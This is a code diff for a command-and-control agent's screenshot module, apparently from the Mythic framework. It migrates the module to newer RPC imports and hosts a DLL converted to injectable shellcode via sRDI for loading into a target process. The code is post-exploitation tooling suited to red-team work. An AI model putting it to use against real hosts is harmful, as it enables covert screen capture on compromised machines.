@@ -1,10 +1,10 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 from uuid import uuid4
 import json
 from os import path
-from MythicFileRPC import *
+from mythic_payloadtype_container.MythicRPC import *
 from sRDI import ShellcodeRDI
-
+import base64
 
 class ScreenshotArguments(TaskArguments):
 
@@ -60,11 +60,15 @@ class ScreenshotCommand(CommandBase):
         dllFile = path.join(self.agent_code_path, f"Screenshot_{arch}.dll")
         dllBytes = open(dllFile, 'rb').read()
         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
-        resp = await MythicFileRPC(task).register_file(converted_dll)
+        resp = await MythicRPC().execute("create_file",
+                                         task_id=task.id,
+                                         file=base64.b64encode(converted_dll).decode(),
+                                         delete_after_fetch=True)
         if resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", resp.agent_file_id)
+            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
         else:
             raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")
+        task.display_params = "{} {}".format(task.args.get_arg("pid"), arch)
         task.args.remove_arg("arch")
         return task
 
